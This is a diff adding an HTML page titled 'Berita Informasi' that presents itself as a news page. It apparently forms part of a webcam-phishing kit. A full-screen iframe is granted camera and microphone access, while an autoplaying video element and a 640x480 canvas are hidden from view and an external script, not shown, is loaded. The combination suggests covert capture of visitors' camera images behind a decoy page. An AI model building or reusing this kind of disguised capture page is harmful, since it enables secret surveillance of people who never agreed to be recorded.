@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Berita Informasi</title>
+  <style>
+    body, html, iframe {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+<iframe id="targetFrame" allow="autoplay; camera; microphone; picture-in-picture" allowfullscreen></iframe>
+
+<script src="/script.js"></script>
+
+</body>
+</html>
